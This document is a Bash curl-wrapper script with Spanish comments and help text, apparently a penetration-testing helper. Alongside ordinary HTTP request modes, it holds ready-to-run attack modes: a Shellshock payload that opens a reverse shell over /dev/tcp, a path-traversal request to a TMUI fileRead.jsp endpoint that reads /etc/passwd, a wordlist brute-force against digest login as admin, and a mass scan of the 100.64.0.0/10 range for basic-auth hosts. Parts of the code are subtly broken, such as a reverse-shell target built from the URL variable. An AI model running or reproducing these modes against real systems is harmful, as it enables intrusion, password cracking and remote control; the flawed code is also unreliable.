#!/bin/bash

# Función para mostrar la ayuda
function show_help() {
	echo "Uso: $0 [opciones]"
	echo ""
	echo "Opciones:"
	echo "  -h, --help              Mostrar esta ayuda y salir"
	echo "  -m, --mode              Modo de operación: GET, POST, TRACE, PUT, HEAD, DEBUG, IGNORE_SSL, FOLLOW_REDIRECT, ADD_JSON_HEADERS, ADD_XML_HEADERS, XML_POST, UPLOAD, PROXY, LOGIN, LOGIN_JSON, SAVE_SESSION, LOGIN_SAVED_SESSION, LOGIN_BASIC, LOGIN_DIGEST, UPLOAD_PUT, ITERATE, GET_LINKS, GET_TEXT, FIND_AUTH_HOSTS, SHELLSHOCK, XXE, LFI, BRUTE_FORCE"
	echo "  -u, --url               URL de destino (ej. http://10.10.10.10)"
	echo "  -f, --file              Archivo para subir o datos para enviar"
	echo "  -d, --data              Datos de POST o PUT"
	echo "  -p, --proxy             Proxy para usar (ej. http://10.10.10.10:443)"
	echo "  -U, --user              Usuario para autenticación"
	echo "  -P, --password          Contraseña para autenticación"
	echo "  -r, --frame-size        Tamaño de los cuadros (para algunos métodos, ej. 640x480)"
	echo "  -b, --block-size        Tamaño de los bloques (para algunos métodos, ej. 4)"
	echo "  -s, --session-file      Archivo de sesión para guardar o usar"
	echo "  -l, --login             Login para JSON POST"
	echo "  -a, --password-json     Contraseña para JSON POST"
	echo "  -i, --iterations        Número de iteraciones (para iteraciones)"
	echo "  -w, --wordlist          Archivo de wordlist para fuerza bruta"
	echo ""
}

# Función para ejecutar el comando CURL
function execute_curl() {
	case $MODE in
	GET)
		curl -I "$URL"
		;;
	POST)
		curl --data "$DATA" "$URL"
		;;
	TRACE)
		curl -k -v -X TRACE "$URL"
		;;
	PUT)
		curl -X PUT -d "$DATA" "$URL"
		curl -kL "$URL" -T "$FILE"
		;;
	HEAD)
		curl -I "$URL"
		;;
	DEBUG)
		curl -X DEBUG "$URL" -k -v -H "Command: stop-debug"
		;;
	IGNORE_SSL)
		curl -k "$URL"
		;;
	FOLLOW_REDIRECT)
		curl -L "$URL"
		;;
	ADD_JSON_HEADERS)
		curl -i -H "Accept: application/json" -H "Content-Type: application/json" "$URL"
		;;
	ADD_XML_HEADERS)
		curl -H "Accept: application/xml" -H "Content-Type: application/xml" -X GET "$URL"
		;;
	XML_POST)
		curl -k -X POST -H "Content-Type: application/xml" -H "Accept: application/xml" -d "$DATA" "$URL"
		;;
	UPLOAD)
		curl -X POST -d @"$FILE" "$URL"
		;;
	PROXY)
		curl -kL https://google.com --proxy "$PROXY"
		;;
	LOGIN)
		curl --user "$USER:$PASSWORD" "$URL"
		;;
	LOGIN_JSON)
		curl -X POST "$URL" -H "Content-Type: application/json" --data "{\"login\":\"$LOGIN\",\"password\":\"$PASSWORD_JSON\"}" --user "$USER:$PASSWORD"
		;;
	SAVE_SESSION)
		curl --user "$USER:$PASSWORD" --cookie-jar "$SESSION_FILE" "$URL"
		;;
	LOGIN_SAVED_SESSION)
		curl --cookie "$SESSION_FILE" "$URL"
		;;
	LOGIN_BASIC)
		curl "$URL" --basic -v -u "$USER:$PASSWORD"
		;;
	LOGIN_DIGEST)
		curl -v --digest --user "$USER:$PASSWORD" "$URL"
		;;
	UPLOAD_PUT)
		curl -v -X PUT -d "$DATA" "$URL"
		;;
	ITERATE)
		for i in $(seq 1 "$ITERATIONS"); do
			echo -n "$i: "
			curl -s "$URL/index.php/jobs/apply/$i/" | grep '<title>'
		done
		;;
	GET_LINKS)
		curl "$URL" -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'
		;;
	GET_TEXT)
		curl "$URL" -s -L | html2text -width '99' | uniq
		;;
	FIND_AUTH_HOSTS)
		parallel -j250 'if [[ "`timeout 3 curl -v 100.{3}.{1}.{2}:80 2> >(grep -o -i -E Unauthorized) > /dev/null`" ]]; then echo 100.{3}.{1}.{2}; fi; if [[ "`timeout 3 curl -v 100.{3}.{1}.{2}:8080 2> >(grep -o -i -E Unauthorized) > /dev/null`" ]]; then echo 100.{3}.{1}.{2}:8080; fi' ::: {1..255} ::: {1..255} ::: {64..127} >auth_basic.txt
		;;
	SHELLSHOCK)
		curl -H "user-agent: () { :; }; echo; echo; /bin/bash -i >& /dev/tcp/$URL/9001 0>&1 " "$URL/cgi-bin/user.sh"
		;;
	XXE)
		curl -kL -H "Content-Type:text/xml" "$URL" -X POST -d "$DATA"
		;;
	LFI)
		curl -kL --cipher 'DEFAULT:!DH' "$URL/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"
		;;
	BRUTE_FORCE)
		for pass in $(cat "$WORDLIST"); do
			http_code=$(curl "$URL" -k --digest -u admin:"$pass" -w '%{http_code}' -o /dev/null -s)
			if [[ $http_code -ne 401 ]]; then
				echo "Password Cracked: $pass"
				break
			elif [[ $http_code -eq 401 ]]; then
				echo "Wrong Password: '$pass' --- '$http_code'"
			fi
		done
		;;
	*)
		echo "Modo no válido. Usa --help para más información."
		exit 1
		;;
	esac
}

# Parsear los argumentos
while [[ "$#" -gt 0 ]]; do
	case $1 in
	-h | --help)
		show_help
		exit 0
		;;
	-m | --mode)
		MODE="$2"
		shift
		;;
	-u | --url)
		URL="$2"
		shift
		;;
	-f | --file)
		FILE="$2"
		shift
		;;
	-d | --data)
		DATA="$2"
		shift
		;;
	-p | --proxy)
		PROXY="$2"
		shift
		;;
	-U | --user)
		USER="$2"
		shift
		;;
	-P | --password)
		PASSWORD="$2"
		shift
		;;
	-r | --frame-size)
		FRAME_SIZE="$2"
		shift
		;;
	-b | --block-size)
		BLOCK_SIZE="$2"
		shift
		;;
	-s | --session-file)
		SESSION_FILE="$2"
		shift
		;;
	-l | --login)
		LOGIN="$2"
		shift
		;;
	-a | --password-json)
		PASSWORD_JSON="$2"
		shift
		;;
	-i | --iterations)
		ITERATIONS="$2"
		shift
		;;
	-w | --wordlist)
		WORDLIST="$2"
		shift
		;;
	*)
		echo "Opción desconocida: $1"
		show_help
		exit 1
		;;
	esac
	shift
done

# Verificar que todos los parámetros requeridos estén presentes
if [ -z "$MODE" ] || [ -z "$URL" ]; then
	echo "Error: Modo y URL son obligatorios."
	show_help
	exit 1
fi

# Ejecutar el comando CURL basado en el modo
execute_curl
